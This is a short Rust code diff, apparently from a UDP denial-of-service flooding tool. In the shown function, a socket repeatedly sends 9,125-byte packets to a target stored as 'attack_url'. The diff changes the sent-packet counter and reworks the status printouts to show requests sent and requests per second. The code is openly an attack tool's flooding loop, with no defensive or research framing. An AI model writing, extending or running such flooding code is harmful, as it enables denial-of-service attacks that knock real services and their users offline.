@@ -24,20 +24,22 @@ fn main_code(result: UdpSocket) {
             let error_data = result.send_to(&[0; 9125], &UNSAFE_PUB_VAR.attack_url);
             match error_data {
                 Ok(data) => {
-                    UNSAFE_PUB_VAR.amount_sent += 1.0;
+                    UNSAFE_PUB_VAR.amount_sent += 1;
                     println!(
-                        "Threads on {},\n UDP Connected,\n Request sent per 10 mil {}, sent mb of data: {}",
+                        "Threads on {},\n UDP Connected,\n Request sent{}, sent mb of data: {}, Request sent per sec {} ",
                         UNSAFE_PUB_VAR.threads_on,
                         UNSAFE_PUB_VAR.amount_sent,
-                        data
+                        data,
+                        UNSAFE_PUB_VAR.time
                     );
                 }
                 Err(data) => {
                     println!(
-                        "Threads on {}, Status ERROR {}\n  Request sent per 10 mil {}",
+                        "Threads on {},\n STATUS ERROR {},\n Request sent{}, Request sent per sec {} ",
                         UNSAFE_PUB_VAR.threads_on,
                         data,
                         UNSAFE_PUB_VAR.amount_sent,
+                        UNSAFE_PUB_VAR.time
                     );
                 }
             }
